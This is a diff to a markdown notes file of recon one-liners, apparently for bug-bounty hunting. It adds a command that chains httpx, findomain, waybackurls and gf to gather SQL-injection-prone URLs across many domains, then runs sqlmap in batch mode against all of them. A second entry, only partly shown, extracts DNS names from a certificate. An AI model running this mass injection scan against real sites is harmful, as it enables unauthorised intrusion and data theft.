@@ -1,5 +1,10 @@
 # notes 
 
+### @ofjaaah again trying to scattergun sqlcmd on every endpoint 
+```
+httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
+```
+
 ### @ofjaaah with the madness to extract DNS from a certificate 
 ```
 sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
